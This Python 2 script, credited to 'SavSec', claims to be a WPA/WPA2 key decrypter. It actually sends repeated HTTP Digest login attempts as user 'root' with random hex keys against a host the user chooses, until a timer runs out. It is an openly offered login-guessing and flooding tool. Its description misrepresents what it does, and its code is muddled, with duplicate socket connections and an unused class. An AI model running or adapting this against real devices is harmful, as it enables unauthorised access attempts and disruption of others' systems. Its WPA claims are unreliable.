from os import *
from sys import *
import binhex
import time
import threading
import itertools
import struct
import sys
import socket
import urllib2
import requests
from requests.auth import HTTPDigestAuth

print ""
print "####################################"
print "__          _______                 "
print "\ \        / /  __ \ /\             "
print " \ \  /\  / /| |__) /  \   _ __ ___ "
print "  \ \/  \/ / |  ___/ /\ \ |  __/ _ \ "
print "   \  /\  /  | |  / ____ \| | | (_)| "
print "    \/  \/   |_| /_/    \_\_|  \___/ "
print ""
print "####################################"
time.sleep(3)
print ""
print "WPA-ro is a Pythonista WPA/WPA2 Key Algorithm Decrypter!\n\nMade by: SavSec\nSavageOfficial Security\n"
time.sleep(2)
usr = "root"
host = raw_input("Host: ")
port = input("Port: ")
# <---- Start Socket Test ----> #

class root(requests.auth.AuthBase):
	def __call__(self, r):
		return r

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except socket.error:
	print "Failed to create socket"
	sys.exit()
print "Socket Created"

try:
	remote_ip = socket.gethostbyname( host )
	s.connect((host, port))

except socket.gaierror:
	print "Hostname could not be resolved."
	sys.exit()

print "Socket Connected " + host
print "Type: " + socket.getservbyport(port)
print "Domain: " + socket.getfqdn(host)

# <---- End Socket Test ----> #
print ""

bits = input("Bits: ")
duration = input("Time: ")
sent = 0
url = "http://" + host
timeout = time.time() + duration
print ""
time.sleep(2)
while 1:
	if time.time() > timeout:
		print "Attempts: %s"%(sent)
		print "Timeout\n"
		print "SavSec (c) 2016 WPA-ro"
		break
	else:
		sent = sent + 1
		import os
		key = os.urandom(bits).encode('hex')
		print "Key (%s Bits):\n%s\n"%(bits, key)
		requests.get(url, auth=HTTPDigestAuth(usr, key))
